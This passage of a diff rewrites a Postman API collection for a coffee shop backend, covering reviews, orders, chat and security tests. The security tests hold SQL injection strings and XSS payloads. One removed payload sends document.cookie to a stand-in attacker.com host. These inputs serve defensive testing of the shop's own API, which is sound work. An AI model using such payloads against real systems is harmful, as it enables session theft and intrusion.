+                "{{categoryId}}"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"name\": \"Ca Phe Rang Xay\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "Cannot set a category as its own parentId."
+          },
+          "response": []
+        },
+        {
+          "name": "Delete Category (Admin/Staff)",
+          "request": {
+            "method": "DELETE",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/product-categories/{{categoryId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "product-categories",
+                "{{categoryId}}"
+              ]
+            },
+            "description": "Blocked (409 ConflictError) if the category still has children. Not blocked if attached to products (cascade removes join rows)."
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Product Properties",
+      "item": [
+        {
+          "name": "List Properties (Admin/Staff)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/product-properties",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "product-properties"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Create Property (Admin/Staff)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/product-properties",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "product-properties"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"name\": \"Xuat xu\",\n  \"dataType\": \"text\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "dataType defaults to 'text' if omitted. name unique case-insensitively. No update/delete endpoint exists."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "if (pm.response.code === 201) {",
+                  "  pm.collectionVariables.set(\"propertyId\", pm.response.json().id);",
+                  "}"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Product Reviews",
+      "item": [
+        {
+          "name": "List Reviews (Admin/Staff)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/product-reviews?page=1&pageSize=20",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "product-reviews"
+              ],
+              "query": [
+                {
+                  "key": "page",
+                  "value": "1"
+                },
+                {
+                  "key": "pageSize",
+                  "value": "20"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Public Reviews for Product",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/product-reviews/product/{{productId}}?page=1&pageSize=20",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "product-reviews",
+                "product",
+                "{{productId}}"
+              ],
+              "query": [
+                {
+                  "key": "page",
+                  "value": "1"
+                },
+                {
+                  "key": "pageSize",
+                  "value": "20"
+                }
+              ]
+            },
+            "description": "No auth. Only category != spam AND status IN (auto_responded, resolved)."
+          },
+          "response": []
+        },
+        {
+          "name": "Get Review By ID (Admin/Staff)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/product-reviews/{{reviewId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "product-reviews",
+                "{{reviewId}}"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Create Review (Customer)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/product-reviews",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "product-reviews"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"productId\": \"{{productId}}\",\n  \"rating\": 4,\n  \"commentText\": \"Ca phe thom, dong goi can than.\",\n  \"source\": \"web\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "requireRole('customer'). customerId/email taken from session, never the body. Triggers a synchronous one-shot Gemini classification."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "if (pm.response.code === 201) {",
+                  "  pm.collectionVariables.set(\"reviewId\", pm.response.json().id);",
+                  "}"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Reply to Review (Admin/Staff)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/product-reviews/{{reviewId}}/replies",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "product-reviews",
+                "{{reviewId}}",
+                "replies"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"authorName\": \"Mist Support\",\n  \"replyText\": \"Cam on ban da danh gia!\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "At most one reply ever (409 if one exists). Auto-transitions review to resolved. authorType hardcoded 'admin' regardless of actor."
+          },
+          "response": []
+        },
+        {
+          "name": "Update Review Status (Admin/Staff)",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/product-reviews/{{reviewId}}/status",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "product-reviews",
+                "{{reviewId}}",
+                "status"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"status\": \"resolved\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
             }
           },
           "response": []
@@ -258,188 +1659,185 @@
       "name": "Orders",
       "item": [
         {
-          "name": "Create Order",
+          "name": "List Orders (Admin/Staff)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/orders?page=1&pageSize=20&status=pending",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "orders"
+              ],
+              "query": [
+                {
+                  "key": "page",
+                  "value": "1"
+                },
+                {
+                  "key": "pageSize",
+                  "value": "20"
+                },
+                {
+                  "key": "status",
+                  "value": "pending"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List My Orders (Customer)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/orders/me?page=1&pageSize=20",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "orders",
+                "me"
+              ],
+              "query": [
+                {
+                  "key": "page",
+                  "value": "1"
+                },
+                {
+                  "key": "pageSize",
+                  "value": "20"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Lookup Order by Code (public)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/orders/lookup?code={{orderId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "orders",
+                "lookup"
+              ],
+              "query": [
+                {
+                  "key": "code",
+                  "value": "{{orderId}}"
+                }
+              ]
+            },
+            "description": "code must be the full order UUID, not a prefix. Public, rate-limited by IP (ORDER_LOOKUP_RATE_MAX/WINDOW)."
+          },
+          "response": []
+        },
+        {
+          "name": "Get Order By ID (Admin/Staff)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/orders/{{orderId}}",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "orders",
+                "{{orderId}}"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Create Order (Customer)",
           "request": {
             "method": "POST",
-            "header": [],
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/orders",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "orders"
+              ]
+            },
             "body": {
               "mode": "raw",
-              "raw": "{\n  \"email\": \"customer@example.com\",\n  \"currency\": \"USD\",\n  \"totalCents\": 1000,\n  \"items\": [\n    {\n      \"productId\": \"550e8400-e29b-41d4-a716-446655440000\",\n      \"name\": \"Premium Mist Coffee\",\n      \"priceCents\": 1000,\n      \"quantity\": 1\n    }\n  ]\n}",
+              "raw": "{\n  \"totalCents\": 125000,\n  \"currency\": \"VND\",\n  \"cashReceivedCents\": 150000,\n  \"shippingFullName\": \"Nguyen Van A\",\n  \"shippingAddress\": \"123 Le Loi, Q1, HCMC\",\n  \"shippingPhone\": \"0901234567\",\n  \"items\": [\n    {\n      \"productVariantId\": \"{{variantId}}\",\n      \"productName\": \"Ca Phe Arabica Da Lat 250g\",\n      \"priceCents\": 125000,\n      \"quantity\": 1\n    }\n  ]\n}",
               "options": {
                 "raw": {
                   "language": "json"
                 }
               }
             },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/orders",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "orders"
-              ]
-            }
+            "description": "requireRole('customer'). No guest checkout. customerEmail comes from session, not the body."
           },
-          "response": []
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "if (pm.response.code === 201) {",
+                  "  pm.collectionVariables.set(\"orderId\", pm.response.json().id);",
+                  "}"
+                ]
+              }
+            }
+          ]
         },
         {
-          "name": "Lookup Own Orders",
+          "name": "Update Order Status (Admin/Staff)",
           "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "GET",
-            "header": [],
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/orders/lookup?email=customer@example.com&code=a1b2c3d4",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "orders",
-                "lookup"
-              ],
-              "query": [
-                {
-                  "key": "email",
-                  "value": "customer@example.com",
-                  "description": "Customer email used at checkout"
-                },
-                {
-                  "key": "code",
-                  "value": "a1b2c3d4",
-                  "description": "8-char hex order code from the receipt (first 8 chars of the order id) — required alongside email"
-                }
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "List All Orders (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "GET",
-            "header": [],
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/orders?limit=10&offset=0&sortBy=createdAt&sortDir=desc",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "orders"
-              ],
-              "query": [
-                {
-                  "key": "email",
-                  "value": "",
-                  "disabled": true
-                },
-                {
-                  "key": "status",
-                  "value": "pending",
-                  "disabled": true
-                },
-                {
-                  "key": "currency",
-                  "value": "USD",
-                  "disabled": true
-                },
-                {
-                  "key": "limit",
-                  "value": "10"
-                },
-                {
-                  "key": "offset",
-                  "value": "0"
-                },
-                {
-                  "key": "sortBy",
-                  "value": "createdAt"
-                },
-                {
-                  "key": "sortDir",
-                  "value": "desc"
-                }
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Get Order By ID (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "GET",
-            "header": [],
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/orders/:id",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "orders",
-                ":id"
-              ],
-              "variable": [
-                {
-                  "key": "id",
-                  "value": "order-uuid-here"
-                }
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Update Order Status (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
             "method": "PATCH",
-            "header": [],
+            "header": [
+              {
+                "key": "X-CSRF-Token",
+                "value": "{{csrfToken}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/orders/{{orderId}}/status",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "orders",
+                "{{orderId}}",
+                "status"
+              ]
+            },
             "body": {
               "mode": "raw",
               "raw": "{\n  \"status\": \"paid\"\n}",
@@ -449,743 +1847,486 @@
                 }
               }
             },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/orders/:id/status",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "orders",
-                ":id",
-                "status"
-              ],
-              "variable": [
-                {
-                  "key": "id",
-                  "value": "order-uuid-here"
-                }
-              ]
-            }
+            "description": "pending->paid|cancelled, paid->shipped|cancelled, shipped->delivered. Skipping steps throws 409 ConflictError."
           },
           "response": []
         }
       ]
     },
     {
-      "name": "Product Types",
+      "name": "Chat",
       "item": [
         {
-          "name": "List Product Types",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "GET",
-            "header": [],
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/product-types",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "product-types"
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Create Product Type (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "POST",
-            "header": [],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"name\": \"Specialty Espresso\"\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
-              }
-            },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/product-types",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "product-types"
-              ]
-            }
-          },
-          "response": []
-        }
-      ]
-    },
-    {
-      "name": "Products",
-      "item": [
-        {
-          "name": "List All Products",
-          "request": {
-            "method": "GET",
-            "header": [],
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/products?limit=20&offset=0&sortBy=createdAt&sortDir=desc",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "products"
-              ],
-              "query": [
-                {
-                  "key": "productTypeId",
-                  "value": "",
-                  "disabled": true
-                },
-                {
-                  "key": "currency",
-                  "value": "USD",
-                  "disabled": true
-                },
-                {
-                  "key": "priceMin",
-                  "value": "100",
-                  "disabled": true
-                },
-                {
-                  "key": "priceMax",
-                  "value": "5000",
-                  "disabled": true
-                },
-                {
-                  "key": "q",
-                  "value": "Mist",
-                  "disabled": true
-                },
-                {
-                  "key": "limit",
-                  "value": "20"
-                },
-                {
-                  "key": "offset",
-                  "value": "0"
-                },
-                {
-                  "key": "sortBy",
-                  "value": "createdAt"
-                },
-                {
-                  "key": "sortDir",
-                  "value": "desc"
-                }
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Get Product By ID",
-          "request": {
-            "method": "GET",
-            "header": [],
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/products/:id",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "products",
-                ":id"
-              ],
-              "variable": [
-                {
-                  "key": "id",
-                  "value": "product-uuid-here"
-                }
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Create Product (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "POST",
-            "header": [],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"name\": \"Morning Mist Signature Latte\",\n  \"description\": \"Smooth and aromatic latte crafted with organic mist-drizzled Arabica beans.\",\n  \"priceCents\": 650,\n  \"currency\": \"USD\",\n  \"image\": \"https://images.example.com/signature-latte.jpg\",\n  \"productTypeId\": \"product-type-uuid-here\"\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
-              }
-            },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/products",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "products"
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Update Product Details (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "PATCH",
-            "header": [],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"name\": \"Morning Mist Signature Latte (V2)\",\n  \"priceCents\": 700,\n  \"stockQuantity\": 150\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
-              }
-            },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/products/:id",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "products",
-                ":id"
-              ],
-              "variable": [
-                {
-                  "key": "id",
-                  "value": "product-uuid-here"
-                }
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Delete Product (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "DELETE",
-            "header": [],
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/products/:id",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "products",
-                ":id"
-              ],
-              "variable": [
-                {
-                  "key": "id",
-                  "value": "product-uuid-here"
-                }
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Get Product Stock (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "GET",
-            "header": [],
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/products/:id/stock",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "products",
-                ":id",
-                "stock"
-              ],
-              "variable": [
-                {
-                  "key": "id",
-                  "value": "product-uuid-here"
-                }
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Increase Product Stock (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "POST",
-            "header": [],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"quantity\": 50\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
-              }
-            },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/products/:id/stock/increase",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "products",
-                ":id",
-                "stock",
-                "increase"
-              ],
-              "variable": [
-                {
-                  "key": "id",
-                  "value": "product-uuid-here"
-                }
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Decrease Product Stock (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "POST",
-            "header": [],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"quantity\": 10\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
-              }
-            },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/products/:id/stock/decrease",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "products",
-                ":id",
-                "stock",
-                "decrease"
-              ],
-              "variable": [
-                {
-                  "key": "id",
-                  "value": "product-uuid-here"
-                }
-              ]
-            }
-          },
-          "response": []
-        }
-      ]
-    },
-    {
-      "name": "Users",
-      "item": [
-        {
-          "name": "List Users (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "GET",
-            "header": [],
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/users?limit=10&offset=0&sortBy=createdAt&sortDir=desc",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "users"
-              ],
-              "query": [
-                {
-                  "key": "role",
-                  "value": "admin",
-                  "disabled": true
-                },
-                {
-                  "key": "status",
-                  "value": "active",
-                  "disabled": true
-                },
-                {
-                  "key": "q",
-                  "value": "John",
-                  "disabled": true
-                },
-                {
-                  "key": "limit",
-                  "value": "10"
-                },
-                {
-                  "key": "offset",
-                  "value": "0"
-                },
-                {
-                  "key": "sortBy",
-                  "value": "createdAt"
-                },
-                {
-                  "key": "sortDir",
-                  "value": "desc"
-                }
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Update User Role/Status (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "PATCH",
-            "header": [],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"role\": \"admin\",\n  \"status\": \"active\"\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
-              }
-            },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/users/:id",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "users",
-                ":id"
-              ],
-              "variable": [
-                {
-                  "key": "id",
-                  "value": "user-uuid-here"
-                }
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Change User Password (Admin)",
-          "request": {
-            "auth": {
-              "type": "bearer",
-              "bearer": [
-                {
-                  "key": "token",
-                  "value": "{{accessToken}}",
-                  "type": "string"
-                }
-              ]
-            },
-            "method": "PATCH",
-            "header": [],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"password\": \"BrandNewSecurePassword123!\"\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
-              }
-            },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/users/:id/password",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "users",
-                ":id",
-                "password"
-              ],
-              "variable": [
-                {
-                  "key": "id",
-                  "value": "user-uuid-here"
-                }
-              ]
-            }
-          },
-          "response": []
-        }
-      ]
-    },
-    {
-      "name": "AI Security WAF Tests",
-      "item": [
-        {
-          "name": "Login - SQL Injection Attack (Blocked)",
-          "request": {
-            "method": "POST",
-            "header": [],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"email\": \"admin@morningmist.com\",\n  \"password\": \"anything' OR '1'='1\"\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
-              }
-            },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/auth/login",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "auth",
-                "login"
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Register - XSS Attack (Blocked)",
+          "name": "Send Chat Message",
           "request": {
             "method": "POST",
             "header": [
               {
-                "key": "x-user-registration-key",
-                "value": "{{registrationKey}}",
+                "key": "Content-Type",
+                "value": "application/json",
                 "type": "text"
               }
             ],
+            "url": {
+              "raw": "{{baseUrl}}/chat",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "chat"
+              ]
+            },
             "body": {
               "mode": "raw",
-              "raw": "{\n  \"firstName\": \"<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>\",\n  \"lastName\": \"XSS\",\n  \"email\": \"attacker@morningmist.com\",\n  \"password\": \"password\"\n}",
+              "raw": "{\n  \"messages\": [\n    {\n      \"role\": \"user\",\n      \"content\": \"Co loai ca phe rang dam nao gia duoi 150k khong?\"\n    }\n  ]\n}",
               "options": {
                 "raw": {
                   "language": "json"
                 }
               }
             },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/auth/register",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "auth",
-                "register"
-              ]
-            }
-          },
-          "response": []
-        },
-        {
-          "name": "Register - Bot/Spam Detection (Blocked)",
-          "request": {
-            "method": "POST",
-            "header": [
-              {
-                "key": "x-user-registration-key",
-                "value": "{{registrationKey}}",
-                "type": "text"
-              }
-            ],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"firstName\": \"Xyz123asdf\",\n  \"lastName\": \"SpamBot\",\n  \"email\": \"spambot12345@tempmail.com\",\n  \"password\": \"password123\"\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
-              }
-            },
-            "url": {
-              "raw": "{{baseUrl}}/api/v1/auth/register",
-              "host": [
-                "{{baseUrl}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "auth",
-                "register"
-              ]
-            }
+            "description": "Public, no login. Rate-limited (CHAT_RATE_MAX/WINDOW). RAG over top-8 pgvector matches + price/weight filter extraction."
           },
           "response": []
         }
       ]
-    }
-  ],
-  "event": [
-    {
-      "listen": "prerequest",
-      "script": {
-        "type": "text/javascript",
-        "exec": [
-          ""
-        ]
-      }
     },
     {
-      "listen": "test",
-      "script": {
-        "type": "text/javascript",
-        "exec": [
-          ""
-        ]
-      }
-    }
-  ],
-  "variable": [
-    {
-      "key": "baseUrl",
-      "value": "https://morning-mist-coffee-backend.onrender.com",
-      "type": "string"
-    },
-    {
-      "key": "accessToken",
-      "value": "YOUR_BEARER_TOKEN_HERE",
-      "type": "string"
-    },
-    {
-      "key": "registrationKey",
-      "value": "YOUR_REGISTRATION_KEY_HERE",
-      "type": "string"
+      "name": "Security Tests",
+      "item": [
+        {
+          "name": "SQLi Attempt - Employee Login",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/auth/employee-login",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "auth",
+                "employee-login"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"admin' OR '1'='1' --\",\n  \"password\": \"x\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "Zod requires a valid email format, so this should fail schema validation (400) before ever touching the DB (Drizzle also parameterizes queries, so no injection is possible either way)."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"rejected, not authenticated\", () => [400, 401].includes(pm.response.code));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "XSS Payload - Customer Registration",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "X-Customer-Registration-Key",
+                "value": "{{customerRegistrationKey}}",
+                "type": "text"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/customers",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "customers"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"firstName\": \"<script>alert(1)</script>\",\n  \"lastName\": \"Test\",\n  \"email\": \"xsstest+{{$randomInt}}@example.com\",\n  \"password\": \"Passw0rd!23\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "description": "No output-encoding vulnerability expected server-side (this API returns JSON, not rendered HTML) - checks the field is stored/returned as literal text, not executed or stripped silently. FE is responsible for escaping on render."
+          },
+          "response": [],
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test(\"field stored as literal string, not silently dropped\", () => { const j = pm.response.json(); pm.expect(j.firstName).to.include(\"<script>\"); });"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Missing CSRF Token on Protected Mutation",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/customers/me",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "customers",
+                "me"
+              ]
+            },
+            "body": {
+              "mode": "raw",
